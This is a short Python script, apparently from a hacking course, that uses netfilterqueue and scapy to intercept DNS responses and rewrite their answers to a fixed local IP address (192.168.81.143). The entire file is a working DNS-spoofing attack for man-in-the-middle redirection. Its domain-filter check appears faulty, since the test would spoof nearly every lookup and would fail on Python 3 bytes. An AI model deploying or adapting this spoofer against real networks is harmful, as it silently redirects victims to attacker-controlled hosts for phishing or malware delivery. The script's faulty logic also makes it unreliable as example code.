#! /usr/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_pocket(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname

         print(scapy_packet.show())
    
         if "http://weevil.info/" not in qname:
             print(" spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata="192.168.81.143")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1

             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].chksum
             del scapy_packet[scapy.UDP].len

             packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_pocket)
queue.run()


























